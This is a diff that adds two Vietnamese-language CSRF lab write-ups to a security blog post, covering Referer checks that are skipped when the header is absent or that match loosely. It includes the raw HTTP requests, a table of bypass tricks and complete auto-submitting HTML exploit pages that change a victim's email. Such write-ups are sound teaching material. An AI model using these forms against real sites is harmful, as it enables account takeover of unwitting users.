@@ -410,6 +410,98 @@ redirectOnConfirmation = (blogPath) => {
 ới nhưng không thoát phiên đăng nhập
 - Sau 5s gửi **POST** để thực hiện việc thay đổi email
 
+### Lab: CSRF where Referer validation depends on header being present
+#### Analysis
+- Một số ứng dụng kiểm tra **header Referer** để xác định xem yêu cầu có đến từ trang cùng **domain** hay không. Nếu có, yêu cầu được chấp nhận; nếu không, bị từ chối.
+- Tính huống dễ bị khai thác khi ứng dụng bảo vệ như sau:
+```python
+if 'Referer' in request.headers:
+    if not request.headers['Referer'].startswith("https://vulnerable-website.com"):
+        block_request()
+# Nhưng nếu không có header => skip kiểm tra
+```
+
+#### Exploit
+- Thử thay đổi email với việc thay đổi giá trị của **header Referer**
+```http
+POST /my-account/change-email HTTP/2
+Host: 0aee0014032fd3cc80840385007a004a.web-security-academy.net
+...
+Referer: https://0aee0014032fd3cc80840385007a004a.web-security-academy.net.com/my-account?id=wiener
+...
+email=a%40gmail.com
+```
+- Ta nhận được response: `"Invalid referer header"`
+- Thử bỏ **header Referer** => Thành công `change-email`
+- Tạo mã khai thác, loại bỏ **header Referer**
+```html
+    <!DOCTYPE html>
+    <html>
+    <head>
+    <meta name="referrer" content="never">
+    </head>
+    <body>
+    <form action="https://0aee0014032fd3cc80840385007a004a.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="evil@gmail.com">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+    </html>
+```
+- Thêm vào body của **Exploit Server** 
+- Deliver to victim
+
+### CSRF with broken Referer validation
+
+| Kỹ thuật kiểm tra Referer sơ sài | Cách bypass                                           |
+| -------------------------------- | ----------------------------------------------------- |
+| `startsWith("...")`              | Dùng subdomain giống prefix                           |
+| `includes("...")`                | Dùng query string hoặc path chứa domain               |
+| Trình duyệt strip query string   | Dùng `Referrer-Policy: unsafe-url` để buộc gửi đủ URL |
+
+#### Analysis
+- Thử thay đổi email trong request `change-email` với việc bỏ **header Referer** => `"Invalid referer header"`
+- Thử thay đổi email trong request `change-email` với việc đặt tên miền của nạn nhân trong phần query string => Thành công
+```http
+POST /my-account/change-email HTTP/2
+Host: 0a6c00b50460461a8049033000d7000e.web-security-academy.net
+...
+Referer: https://exploit-0ad8004f04d746e48050023501580002.exploit-server.net?abc=0a6c00b50460461a8049033000d7000e.web-security-academy.net
+...
+email=evil%40gmail.com
+```
+- Lợi dụng điều này để khai thác 
+#### Exploit
+- Tạo mã khai thác và thêm vào body của **Exploit Server** 
+```html
+    <head>
+        <meta name="referrer" content="unsafe-url">
+    </head>
+    <form action="https://0a6c00b50460461a8049033000d7000e.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="evil@gmail.com">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        history.pushState("", "", "/?0a6c00b50460461a8049033000d7000e.web-security-academy.net");
+        document.forms[0].submit();
+    </script>
+```
+- `history.pushState()`:  Khi form submit, browser sẽ set Referer là 
+```
+https://exploit-0ad8004f04d746e48050023501580002.exploit-server.net/?0a6c00b50460461a8049033000d7000e.web-security-academy.net
+```
+- Vấn đề: Trình duyệt mặc định không gửi phần ?xxx=... trong Referer nữa (vì lý do bảo mật). Vì vậy mặc dù pushState thành công, Referer thật sự chỉ là:
+```
+https://exploit-0ad8004f04d746e48050023501580002.exploit-server.net
+```
+- `Referrer-Policy: unsafe-url` buộc trình duyệt sẽ gửi **Referer** đẩy đủ, bao gồm query string chứa domain hợp lệ
+
+> **Header** này có thể bị **browser** hoặc **CSP (Content Security Policy)** giới hạn hoặc ghi đè trong môi trường thực tế.
+{: .prompt-warning }
+
 ## Prevent
 ---
 Hiện nay, để khai thác thành công một lỗ hổng **CSRF**, kẻ tấn công thường phải vượt qua các biện pháp phòng vệ được triển khai bởi website mục tiêu, trình duyệt của nạn nhân, hoặc cả hai.
